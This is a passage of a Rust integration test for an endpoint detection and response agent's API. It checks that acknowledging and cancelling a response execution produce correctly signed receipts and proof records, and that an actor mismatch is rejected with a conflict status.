            .unwrap_or_else(|e| panic!("actor-mismatched execution proof request failed: {e}"));
        let mismatch_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read actor-mismatched execution proof response: {e}")
            });
        assert_eq!(
            mismatch_status,
            StatusCode::CONFLICT,
            "unexpected actor-mismatched execution proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        assert!(String::from_utf8_lossy(&bytes).contains("actor"));
        {
            let mut ledger = state.edr_response_execution_ledger.lock().await;
            ledger
                .append(&original_execution)
                .unwrap_or_else(|e| panic!("failed to restore original response execution: {e}"));
        }

        let body = serde_json::json!({
            "acknowledgedBy": "operator:test",
            "note": "operator reviewed collect evidence outcome"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build execution acknowledgement request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("execution acknowledgement request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read execution acknowledgement response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "unexpected execution acknowledgement response body: {}",
            String::from_utf8_lossy(&bytes)
        );
        let acknowledgement_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode execution acknowledgement response: {e}"));
        assert_eq!(
            acknowledgement_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_acknowledgement"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build acknowledged execution proof request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("acknowledged execution proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read acknowledged execution proof response: {e}")
            });
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected acknowledged execution proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let acknowledged_proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| {
                panic!("failed to decode acknowledged execution proof response: {e}")
            });
        let acknowledgement_receipts = acknowledged_proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledged proof acknowledgement receipts"));
        assert_eq!(acknowledgement_receipts.len(), 1);
        let acknowledgement_decision =
            &acknowledgement_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(
            acknowledgement_decision["receiptFamily"],
            "response_acknowledgement"
        );
        assert_eq!(
            acknowledgement_decision["decision"]["action"],
            payload["execution"]["action"]
        );
        assert_eq!(
            acknowledgement_decision["decision"]["rollbackRef"],
            payload["execution"]["rollbackRef"]
        );
        let acknowledgement_evidence = acknowledgement_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledgement receipt evidence"));
        assert!(acknowledgement_evidence
            .iter()
            .any(|item| item["key"] == "acknowledgementId"));
        assert!(acknowledgement_evidence
            .iter()
            .any(|item| item["key"] == "executionId"));
        assert!(acknowledgement_evidence
            .iter()
            .any(|item| item["key"] == "responseActionId"));

        let body = serde_json::json!({
            "reason": "operator closed the local response window"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build execution cancel request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("execution cancel request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read execution cancel response: {e}"));
        let cancel_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode execution cancel response: {e}"));
        assert_eq!(
            cancel_payload["execution"]["execution"]["status"],
            "cancelled"
        );
        assert_eq!(
            cancel_payload["execution"]["rollbackRef"],
            payload["execution"]["rollbackRef"]
        );

        let cancel_receipt: SignedReceipt =
            serde_json::from_value(cancel_payload["receipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode cancellation receipt: {e}"));
        let cancel_decision = cancel_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing cancellation endpointDecision metadata"));
        let public_key = cancel_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing cancellation receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse cancellation receipt public key: {e}"));
        let verification =
            cancel_receipt.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(cancel_decision["receiptFamily"], "response_execution");
        assert_eq!(cancel_decision["actor"]["userId"], "operator:test");
        assert_eq!(
            cancel_decision["actor"]["approvalId"],
            "approval-response-action"
        );
        assert_eq!(
            cancel_decision["decision"]["title"],
            "Endpoint response action cancelled"
        );
        assert_eq!(
            cancel_decision["decision"]["rollbackRef"],
            payload["execution"]["rollbackRef"]
        );
        assert_eq!(
            cancel_decision["decision"]["passed"],
            serde_json::Value::Bool(false)
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build cancelled execution proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cancelled execution proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cancelled execution proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected cancelled execution proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let cancelled_proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cancelled execution proof response: {e}"));
        let transition_receipts = cancelled_proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cancelled proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action cancelled"
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["execution"]["rollbackRef"]
        );
        assert_eq!(
            cancelled_proof_payload["rollbackReceipts"]
                .as_array()
                .unwrap_or_else(|| panic!("missing cancelled proof rollback receipts"))
                .len(),
            0
        );
        assert_eq!(
            cancelled_proof_payload["acknowledgementReceipts"]
                .as_array()
                .unwrap_or_else(|| panic!("missing cancelled proof acknowledgement receipts"))
                .len(),
            1
        );

        let _ = std::fs::remove_file(receipt_path);
        let _ = std::fs::remove_file(execution_path);
    }

